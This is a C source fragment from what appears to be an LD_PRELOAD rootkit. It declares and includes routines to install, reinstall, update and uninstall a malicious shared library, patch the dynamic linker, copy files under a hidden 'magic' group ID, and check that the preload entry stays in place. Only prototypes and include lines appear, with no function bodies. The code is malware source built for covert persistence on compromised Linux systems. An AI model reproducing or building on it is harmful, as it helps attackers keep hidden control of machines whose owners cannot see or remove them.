char *sogetplatform(char *sopath);
char *sogetpath(char *sopath, char *installdir, char *bdvlso);
int socopy(const char *opath, char *npath, gid_t magicgid);
#include "so.c"

#ifdef PATCH_DYNAMIC_LINKER
#include "ldpatch/ldpatch.h"
#endif

void eradicatedir(const char *target);
#ifdef UNINSTALL_MY_ASS
void uninstallass(void);
#endif
void rmbdvpaths(void);
void uninstallbdv(void);
#include "uninstall.c"

int rknomore(char *installdir, char *bdvlso);
int _preloadok(const char *preloadpath);
int preloadok(const char *preloadpath);
void reinstall(const char *preloadpath, char *installdir, char *bdvlso);
#include "reinstall.c"

void bdvinstall(char *const argv[], char *installdir, char *bdvlso, char *preloadpath, gid_t magicgid);
#include "install.c"

void bdvupdate(char *const argv[]);
#include "update.c"